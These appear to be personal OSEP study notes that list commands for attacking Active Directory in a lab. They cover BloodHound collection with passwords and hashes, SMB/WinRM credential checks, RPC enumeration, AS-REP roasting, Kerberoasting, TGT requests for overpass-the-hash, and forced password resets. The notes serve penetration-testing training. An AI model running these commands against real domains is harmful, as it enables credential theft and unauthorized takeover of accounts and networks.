# OSEP Notes: Active Directory

Source: https://steffinstanly.gitbook.io/osep-notes/active-directory

## Domain Reconnaissance on Kali

### BloodHound
```bash
proxychains bloodhound-python -c ALL -u kevin -p 'Passw0rd' -d red.com -dc dc.red.com -ns 10.9.20.10 --dns-tcp
```

With machine account hash:
```bash
proxychains bloodhound-python3 -c ALL -u 'WEB05$@RED.COM' --hashes 00000000000000000000000000000000:d66f37fd3d677522959e5b4aeecafb78 -d COMPLYEDGE.COM -ns 172.16.76.168 --dns-tcp
# (Extract NTLM from /etc/krb5cc.keytab)
```

### SMB Access
```bash
smbmap -H 10.9.20.10 -u kevin -p Passw0rd
```

### WinRM Access
```bash
crackmapexec winrm 10.9.20.10 -u kevin -p 'Password'
```

### SMB Signing Check
```bash
crackmapexec smb 10.9.20.10
```

## User Enumeration

### RPCClient
```bash
proxychains rpcclient -U red.com/kevin.gustavo%Passw0rd 10.9.20.10
enumdomusers
queryuser 0x3601
```

### Impacket
```bash
proxychains python3 GetADUsers.py -all -k -no-pass -dc-ip 10.9.20.10 red.com/Administrator
```

## Group Enumeration

### RPCClient
```
enumdomgroups
querygroup 0x200
```

## AS-REP Roasting
```bash
python3 impacket/example/GetNPUsers.py red.com/ -no-pass -dc-ip 10.9.20.10 -userfile users.txt /format:hashcat
```

## Kerberoasting
```bash
python3 impacket/example/GetUserSPNs.py red.com/kevin:Passw0rd -dc-ip 10.9.20.10
```

## Overpass the Hash / PTK
```bash
python3 impacket/example/getTGT.py red.com/kevin:Passw0rd
```

## Reset AD Password (RPCClient)
```
setuserinfo2 lawrencecohen 23 'Passw0rd'
```
